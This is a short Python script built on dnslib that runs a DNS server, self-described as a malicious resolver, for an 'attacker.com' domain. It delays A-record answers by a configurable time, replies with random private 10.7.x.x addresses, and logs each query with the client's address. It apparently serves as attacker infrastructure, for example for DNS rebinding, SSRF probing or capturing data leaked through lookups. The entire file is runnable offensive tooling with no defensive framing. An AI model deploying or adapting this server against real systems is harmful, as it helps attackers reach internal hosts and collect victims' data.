import time
import random
import string
from dnslib import DNSHeader, RR, A, QTYPE, DNSLabel
from dnslib.server import DNSServer, DNSLogger

# --- Configuration ---
ATTACKER_DOMAIN = "attacker.com"
MY_IP = "0.0.0.0"
PORT = 53
DELAY_SECONDS = 0.0

class DelayedResolver:
    """
    A malicious DNS resolver that delays responses for specific domain queries.
    """
    def generate_random_ip(self):
        """Generate a random private IP address for responses"""
        return "10.7.{}.{}".format(
            random.randint(1, 255),
            random.randint(3, 254)
        )

    def resolve(self, request, handler):
        """
        Core logic for processing DNS requests.
        """
        qname = request.q.qname
        qtype = request.q.qtype

        # Print received request info for debugging
        print(f"[+] Received query for: {qname} (Type: {QTYPE[qtype]}) from {handler.client_address[0]}")

        # Check if the query targets our controlled domain and its subdomains
        if qname.matchSuffix(DNSLabel(ATTACKER_DOMAIN)):

            # Check if the query type is A record
            if qtype == QTYPE.A:
                print(f"[*] Query matches our domain. Waiting for {DELAY_SECONDS} second(s)...")

                # [Key step] Wait for the specified delay
                time.sleep(DELAY_SECONDS)

                # Create a response packet
                reply = request.reply()
                random_ip = self.generate_random_ip()

                # Add A record response
                reply.add_answer(RR(qname, QTYPE.A, rdata=A(random_ip)))

                print(f"[!] Responded to {qname} with IP {random_ip} after delay.")

                # Return the delayed response
                return reply

        # For all other non-matching queries, return an empty response
        print(f"[-] Query for {qname} does not match our rules. Replying empty.")
        return request.reply()

# --- Main entry point ---
if __name__ == '__main__':
    # Setup and start DNS server
    logger = DNSLogger(prefix=False)
    resolver = DelayedResolver()
    # Use configured IP and port
    server = DNSServer(resolver, port=PORT, address=MY_IP, logger=logger)

    print(f"[*] Starting Delayed DNS Server for *.{ATTACKER_DOMAIN}")
    print(f"[*] Listening on {MY_IP}:{PORT}")
    print(f"[*] Response delay is set to {DELAY_SECONDS} seconds.")

    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[*] Server shutting down.")
        server.stop()